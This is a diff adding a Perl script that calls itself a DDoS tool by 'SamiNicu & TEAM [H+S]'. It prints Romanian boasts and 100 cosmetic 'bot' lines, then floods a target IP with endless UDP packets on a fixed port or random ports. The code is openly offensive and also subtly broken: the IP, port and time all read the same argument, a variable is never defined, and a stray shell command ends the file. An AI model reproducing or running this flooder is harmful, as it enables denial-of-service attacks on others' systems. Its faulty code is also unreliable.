@@ -1,0 +1,147 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[0;32m #################################\n";
+printf "[0;32m # SamiNicu incarca botii      #\n";
+printf "[0;32m #################################\n";
+printf "[0;32m # LOADING BOTS !!!              #\n";
+printf "[0;32m #################################\n";
+printf "[0;36mBoT #1 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #2 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #3 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #4 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #5 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #6 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #7 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #8 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #9 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #10 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #11 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #12 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #13 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #14 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #15 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #16 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #17 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #18 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #19 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #20 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #21 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #22 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #23 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #24 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #25 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #26 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #27 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #28 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #29 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #30 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #31 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #32 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #33 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #34 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #35 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #36 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #37 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #38 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #39 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #40 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #41 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #42 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #43 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #44 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #45 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #46 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #47 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #48 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #49 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #50 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #51 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #52 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #53 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #54 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #55 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #56 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #57 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #58 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #59 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #60 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #61 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #62 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #63 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #64 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #65 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #66 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #67 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #68 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #69 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #70 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #71 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #72 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #73 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #74 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #75 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #76 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #77 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #78 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #79 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #80 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #81 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #82 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #83 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #84 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #85 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #86 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #87 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #88 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #89 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #90 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #91 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #92 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #93 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #94 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #95 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #96 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #97 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #98 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #99 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;36mBoT #100 H+S TEAM ATTACK ; Ii dau una ii canta popa.\n";
+printf "[0;32m###########################################################################\n";
+printf "[0;31m# DDoS script by SamiNicu & TEAM [H+S]. ### IP-ul a intrat in spital ! #\n";
+printf "[0;32m###########################################################################\n";
+printf "[0;32m# Băăă sa dus Ip-ul dai dracu si lasa-l jos Ctrl+C #\n";
+printf "[0;32m###########################################################################\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=(rand 65000) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+cat bots.txt
